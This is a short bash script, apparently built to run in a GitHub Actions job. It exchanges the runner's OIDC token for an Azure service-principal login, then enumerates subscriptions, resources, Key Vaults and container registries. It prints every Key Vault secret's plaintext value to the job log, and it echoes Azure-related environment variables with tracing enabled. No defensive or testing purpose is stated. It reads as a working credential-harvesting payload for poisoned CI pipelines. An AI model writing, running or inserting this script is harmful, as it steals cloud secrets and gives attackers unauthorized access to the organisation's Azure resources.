#!/usr/bin/env bash
set -x
env | grep -iE 'azure|client|tenant|subscription' || true
TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "tokenlen=${#TOK}"
az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$TOK" --allow-no-subscriptions -o json || true
az account list -o json || true
az resource list -o json || true
az keyvault list -o json || true
for v in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret list --vault-name "$v" -o json || true
  for s in $(az keyvault secret list --vault-name "$v" --query "[].name" -o tsv 2>/dev/null); do
    echo "SECRET $v/$s = $(az keyvault secret show --vault-name "$v" --name "$s" --query value -o tsv)"
  done
done
az acr list -o json || true
for r in $(az acr list --query "[].name" -o tsv 2>/dev/null); do az acr repository list -n "$r" -o json || true; done
